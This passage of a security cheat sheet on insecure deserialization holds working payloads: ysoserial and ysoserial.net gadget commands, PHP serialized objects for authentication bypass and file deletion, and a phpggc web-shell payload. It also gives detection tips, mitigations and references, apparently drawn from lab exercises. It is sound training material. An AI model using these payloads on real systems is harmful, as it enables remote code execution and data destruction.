```



\#### \*\*LosFormatter\*\*



\- Use `BinaryFormatter` internally.



```

.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

```



\#### \*\*JSON.NET\*\*



\- In C# source code, look for `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`



```bash

.\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t

{

&#x20;   '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 

&#x20;   'MethodName':'Start',

&#x20;   'MethodParameters':{

&#x20;       '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',

&#x20;       '$values':\['cmd', '/c calc.exe']

&#x20;   },

&#x20;   'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}

}

```



\#### \*\*BinaryFormatter\*\*



\- The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.

\- In C# source code, look for `System.Runtime.Serialization.Binary.BinaryFormatter`

\- Exploitation requires `\[Serializable]` or `ISerializable` interface.



```bash

./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

```



\## Detection



\*\*Whitebox Testing\*\*



\- PHP Based Application

&#x20;   - \*\*`serialize()`\*\*

&#x20;   - \*\*`unserialize()`\*\*

\- Python Based Application

&#x20;   - \*\*`pickle.load()`\*\*

&#x20;   - \*\*`jsonpickle.decode()`\*\*

\- Java

&#x20;   - \*\*`readObject()`\*\*

\- Ruby

&#x20;   - \*\*`Marshal.load()`\*\*

\- C#  / .Net

&#x20;   - \*\*`Deserializ()`\*\*

&#x20;   - \*\*`XmlSerializer(typeof(<CONTROLLED\_PART>));`\*\*



\*\*Blackbox Testing\*\*



\- If any application is using any bearer token or session cookie that is starting with the specified Base64 entries or the mentioned hex header values then one can find out the type of serialization and deserialization the application is using.



| \*\*Object Type\*\* | \*\*Header (Hex)\*\* | \*\*Header (Base64)\*\* |

| --- | --- | --- |

| Java Serialized | AC ED | rO0 |

| .NET ViewState | FF 01 | /w |

| Python Pickle | 80 04 95 | gASV |

| PHP Serialized | 4F 3A | Tz |

| Ruby Serialized | 04 08 |  |



\## Impact



\### Authentication Bypass



\- In case of PHP serialization one can craft a payload like this to bypass authentication mechanisms

\- here setting the admin boolean value to true.



```bash

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

```



\### Deleting Arbitrary Files



\- In case of PHP serialization, one can submit this type of payload to delete any server side files.

\- The application by default sending a base64 encoded PHP serialized object to handle different account deletion functionalities. The functionality can be misused to delete any server side files.



```bash

O:4:"User":3:{s:8:"username";s:5:"wiener";s:12:"access\_token";s:32:"orwtljhce6nd12glundbn07ori09nte7";s:11:"avatar\_link";s:18:"users/wiener/avatar";}

```



\### Object Injection



\- A malicious serialized object can be crafted to inject it server side for exploitation

\- Here is an example PHP code



```bash

<?php



class CustomTemplate {

&#x20;   private $template\_file\_path;

&#x20;   private $lock\_file\_path;



&#x20;   public function \_\_construct($template\_file\_path) {

&#x20;       $this->template\_file\_path = $template\_file\_path;

&#x20;       $this->lock\_file\_path = $template\_file\_path . ".lock";

&#x20;   }



&#x20;   private function isTemplateLocked() {

&#x20;       return file\_exists($this->lock\_file\_path);

&#x20;   }



&#x20;   public function getTemplate() {

&#x20;       return file\_get\_contents($this->template\_file\_path);

&#x20;   }



&#x20;   public function saveTemplate($template) {

&#x20;       if (!isTemplateLocked()) {

&#x20;           if (file\_put\_contents($this->lock\_file\_path, "") === false) {

&#x20;               throw new Exception("Could not write to " . $this->lock\_file\_path);

&#x20;           }

&#x20;           if (file\_put\_contents($this->template\_file\_path, $template) === false) {

&#x20;               throw new Exception("Could not write to " . $this->template\_file\_path);

&#x20;           }

&#x20;       }

&#x20;   }



&#x20;   function \_\_destruct() {

&#x20;       // Carlos thought this would be a good idea

&#x20;       if (file\_exists($this->lock\_file\_path)) {

&#x20;           unlink($this->lock\_file\_path);

&#x20;       }

&#x20;   }

}



?>

```



\- One can craft a object like this to delete any server side file



```bash

O:14:"CustomTemplate":1:{s:14:"lock\_file\_path";s:23:"/home/carlos/morale.txt";}

```



\### Remote Command Execution



\- Different tool can be used to exploit RCE vulnerabilities in different frameworks

\- \*\*`phpggc`\*\*

&#x20;   - This tools helps to exploit any PHP based serialization and deserialization



```bash

./phpggc Laravel/RCE2 '<?php echo system($\_REQUEST\['cmd'])?>'

```



\- \*\*`ysoserial`\*\*

&#x20;   - This tool can be used to exploit any Java based serialization and deserialization



```bash

java \\                  

&#x20; --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \\

&#x20; --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\

&#x20; --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\

&#x20; --add-opens=java.base/java.net=ALL-UNNAMED \\

&#x20; --add-opens=java.base/java.util=ALL-UNNAMED \\

&#x20; -jar ysoserial-all.jar CommonsCollections3 "rm /home/carlos/morale.txt" > test



```



\## Mitigation and Prevention



\### Avoiding deserialization of untrusted data



Unsafe Sources



\- HTTP Requests Headers and Parameters

\- Cookies

\- Hidden form fields

\- API request bodies

\- Message queues

\- Uploaded files

\- WebSocket messages



\### Avoiding object serialization formats that allow object reconstruction



\*\*Avoiding\*\*



\- Java Serialization

\- PHP `serialize()`

\- Python `pickle`

\- .NET `BinaryFormatter`

\- Ruby `Marshal.load`



\*\*Preferring\*\* 



\- JSON

\- XML with strict schema validation

\- Protocol Buffers

\- Primitive data structures



\### Integrity Protection



Enforcing \*\*cryptographic integrity checks\*\*



\- HMAC

\- Digital Signatures



\### Implement Strict Input Validation



Validating every field after deserialization.



Validating



\- Data Type

\- Allowed values

\- Length

\- Structure



\## Tools



\- \*\*`phpggc`\*\*



https://github.com/ambionics/phpggc



\- \*\*`ysoseriali`\*\*



https://github.com/frohoff/ysoserial



\- \*\*`JMET`\*\*



https://github.com/matthiaskaiser/jmet



\- \*\*`ysoserial.net`\*\*



https://github.com/pwntester/ysoserial.net



\## Good to Read



\- https://hackerone.com/reports/3090123

\- https://hackerone.com/reports/838196

\- https://hackerone.com/reports/361341



\## References



\- https://learn.snyk.io/lesson/insecure-deserialization/?ecosystem=java

\- https://portswigger.net/web-security/deserialization

\- https://payatu.com/blog/insecure-deserialization-java-expliotation/

\- https://www.vaadata.com/blog/exploiting-and-preventing-insecure-deserialization-vulnerabilities/

\- https://web.archive.org/web/20180527082635/https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf

\- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

\- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure Deserialization

\- https://academy.hackthebox.com/course/preview/introduction-to-deserialization-attacks

\- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

